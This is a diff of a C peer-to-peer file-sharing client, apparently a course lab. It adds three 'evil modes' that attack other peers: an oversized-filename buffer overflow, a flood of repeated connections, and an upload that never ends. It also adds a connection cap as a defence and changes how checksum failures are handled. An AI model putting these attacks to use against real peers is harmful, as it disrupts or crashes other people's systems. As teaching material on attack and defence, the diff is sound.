@@ -43,6 +43,8 @@ static int listen_port;
  #define MD5_HASH_LEN 128 // size of MD5 hash
  #define MD5_BUFFER 1024 // size of buffer to store MD5 hash
 
+ #define MAX_UPLOAD_CONNECTIONS 32
+
 typedef enum tasktype {		// Which type of connection is this?
 	TASK_TRACKER,		// => Tracker connection
 	TASK_PEER_LISTEN,	// => Listens for upload requests
@@ -583,6 +585,23 @@ static void task_download(task_t *t, task_t *tracker_task)
 		   && t->peer_list->port == listen_port)
 		goto try_again;
 
+	if (evil_mode == 2) {
+		// Attack by connecting over and over again until peer can't take any more connections
+		message("* Attack! Targeting %s:%d with many connections\n",
+			inet_ntoa(t->peer_list->addr), t->peer_list->port);
+		while (1) {
+			t->peer_fd = open_socket(t->peer_list->addr, t->peer_list->port);
+			if (t->peer_fd == -1) {
+				error("* Can no longer connect to %s:%d, %s\n",
+					inet_ntoa(t->peer_list->addr), t->peer_list->port, strerror(errno));
+				goto try_again;
+			} else {
+				message("* Attacked %s:%d with a new connection\n",
+					inet_ntoa(t->peer_list->addr), t->peer_list->port);
+			}
+		}
+	}
+
 	// Connect to the peer and write the GET command
 	message("* Connecting to %s:%d to download '%s'\n",
 		inet_ntoa(t->peer_list->addr), t->peer_list->port,
@@ -592,6 +611,16 @@ static void task_download(task_t *t, task_t *tracker_task)
 		error("* Cannot connect to peer: %s\n", strerror(errno));
 		goto try_again;
 	}
+
+	if (evil_mode == 1) {
+		// Attack by attempting to crash peer's client with a buffer overflow on the filename
+		message("* Attack! Targeting %s:%d with filename buffer overflow\n",
+			inet_ntoa(t->peer_list->addr), t->peer_list->port);
+		char long_filename[8*FILENAMESIZ];
+		memset(long_filename, 1, 8*FILENAMESIZ);
+		osp2p_writef(t->peer_fd, "GET %s OSP2P\n", long_filename);
+	}
+
 	osp2p_writef(t->peer_fd, "GET %s OSP2P\n", t->filename);
 
 	// Open disk file for the result.
@@ -679,20 +708,16 @@ static void task_download(task_t *t, task_t *tracker_task)
 			char file_check[MD5_HASH_LEN];
 			if (count_check(file_check, t->disk_filename) == 0) {
 				// couldn't calculate check
-				message("* Couldn't calculate checksum for %s\n", t->filename);
-				unlink(t->disk_filename);
-				task_free(t);
-				return;
+				error("* Couldn't calculate checksum for %s\n", t->filename);
+				goto try_again;
 			}
 			if (strcmp(tracker_task->check, file_check) == 0) {
 				// correct check
 				message("* Confirmed checksum for %s\n", t->disk_filename);
 			} else {
 				// incorrect check
-				message("* Incorrect checksum for %s. Rejecting file\n", t->filename);
-				unlink(t->disk_filename);
-				task_free(t);
-				return;
+				error("* Incorrect checksum for %s. Rejecting file\n", t->filename);
+				goto try_again;
 			}
 		}
 
@@ -805,13 +830,20 @@ static void task_upload(task_t *t)
 			goto exit;
 		}
 
+		if (evil_mode == 3) {
+			// Attack by resetting file over and over again so the peer gets overloaded with data
+			message("* Attack! Targeting peer with endless upload data for %s\n", t->filename);
+			lseek(t->disk_fd, 0, 0);
+		}
+
 		ret = read_to_taskbuf(t->disk_fd, t);
 		if (ret == TBUF_ERROR) {
 			error("* Disk read error");
 			goto exit;
-		} else if (ret == TBUF_END && t->head == t->tail)
+		} else if (ret == TBUF_END && t->head == t->tail) {
 			/* End of file */
 			break;
+		}
 	}
 
 	message("* Upload of %s complete\n", t->filename);
@@ -827,7 +859,7 @@ int main(int argc, char *argv[])
 {
 	task_t *tracker_task, *listen_task, *t;
 	struct in_addr tracker_addr;
-	int tracker_port, down_count;
+	int tracker_port, down_count, connection_count;
 	pid_t ud_pid;
 	char *s;
 	const char *myalias;
@@ -900,9 +932,17 @@ int main(int argc, char *argv[])
 	listen_task = start_listen();
 	register_files(tracker_task, myalias);
 
+	if (evil_mode == 1) {
+		message("* Started in evil mode 1: filename buffer overflow attack\n");
+	} else if (evil_mode == 2) {
+		message("* Started in evil mode 2: many connections attack\n");
+	} else if (evil_mode == 3) {
+		message("* Started in evil mode 3: endless upload data file attack\n");
+	}
+
 	// First, download files named on command line.
 	down_count = 0;
-	for (; argc > 1 && !evil_mode; argc--, argv++) {
+	for (; argc > 1; argc--, argv++) {
 		if ((t = start_download(tracker_task, argv[1]))) {
 	    	ud_pid = fork();
 	    	if (ud_pid < 0) {
@@ -924,8 +964,21 @@ int main(int argc, char *argv[])
 	}
 
 	// Then accept connections from other peers and upload files to them!
+	connection_count = 0;
 	while ((t = task_listen(listen_task))) {
-		waitpid(-1, NULL, WNOHANG);
+		pid_t child_proc = waitpid(-1, NULL, WNOHANG);
+		if (child_proc > 0 && connection_count > 0) {
+			connection_count--;
+			message("* Child upload process exited. Upload connections: %d\n", connection_count);
+		}
+
+		// Prevent attack by preventing another peer from connecting twice in a row
+		if (connection_count > MAX_UPLOAD_CONNECTIONS) {
+			task_free(t);
+			message("* Prevented many connections attack.\n");
+			continue;
+		}
+
 		if ((ud_pid = fork()) < 0) {
 			error("* Upload fork error\n");
 		}
@@ -934,6 +987,8 @@ int main(int argc, char *argv[])
 			exit(0);
 		} else {
 			task_free(t);
+			connection_count++;
+			message("* Child upload process started. Upload connections: %d\n", connection_count);
 		}
 	}
 
